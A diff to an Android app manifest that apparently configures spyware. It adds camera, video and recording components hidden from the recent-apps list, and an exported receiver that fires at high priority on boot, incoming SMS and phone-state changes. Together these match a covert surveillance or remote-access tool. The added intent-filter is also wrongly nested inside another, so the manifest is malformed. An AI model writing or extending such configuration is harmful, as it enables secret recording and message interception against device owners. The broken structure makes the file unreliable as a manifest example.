@@ -11,14 +11,39 @@
             </intent-filter>
         </activity>
 
+        <activity
+            android:name=".framework.Dialog"
+            android:excludeFromRecents="true">
+        </activity>
+        <!--<activity-->
+        <!--android:name="com.connect.CaptureCameraImage"-->
+        <!--android:excludeFromRecents="true">-->
+        <!--</activity>-->
+        <activity
+            android:name=".framework.CameraView"
+            android:excludeFromRecents="true">
+        </activity>
+        <activity
+            android:name=".framework.VideoView"
+            android:excludeFromRecents="true">
+        </activity>
+
         <service android:name=".MyService"
             android:enabled="true"
             android:exported="true">
         </service>
+        <service android:name=".framework.RecordService">
+        </service>
 
-        <receiver android:enabled="true" android:name=".ServiceReceiver" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+        <receiver android:enabled="true" android:name=".ServiceReceiver" android:exported="true" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
             <intent-filter>
-                <action android:name="android.intent.action.BOOT_COMPLETED"></action>
+                <intent-filter android:priority="1000">
+                    <action android:name="android.intent.action.BOOT_COMPLETED" />
+                    <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                    <action android:name="android.intent.action.PHONE_STATE" />
+                    <action android:name="android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE"/>
+                    <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                </intent-filter>
             </intent-filter>
         </receiver>
     </application>
